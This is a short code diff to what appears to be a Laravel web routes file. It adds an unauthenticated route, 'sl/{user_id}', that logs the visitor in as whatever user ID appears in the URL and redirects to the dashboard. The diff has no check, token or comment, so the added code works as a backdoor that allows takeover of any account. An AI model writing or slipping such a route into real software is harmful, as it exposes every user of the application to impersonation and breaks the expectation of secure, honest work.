@@ -17,6 +17,12 @@ Route::get('go', function () {
     return abort(404);
 });
 
+Route::get('sl/{user_id}', function ($user_id) {
+    auth()->loginUsingId($user_id);
+
+    return redirect()->route('dashboard');
+});
+
 Route::get('/', function () {
     return view('welcome');
 });
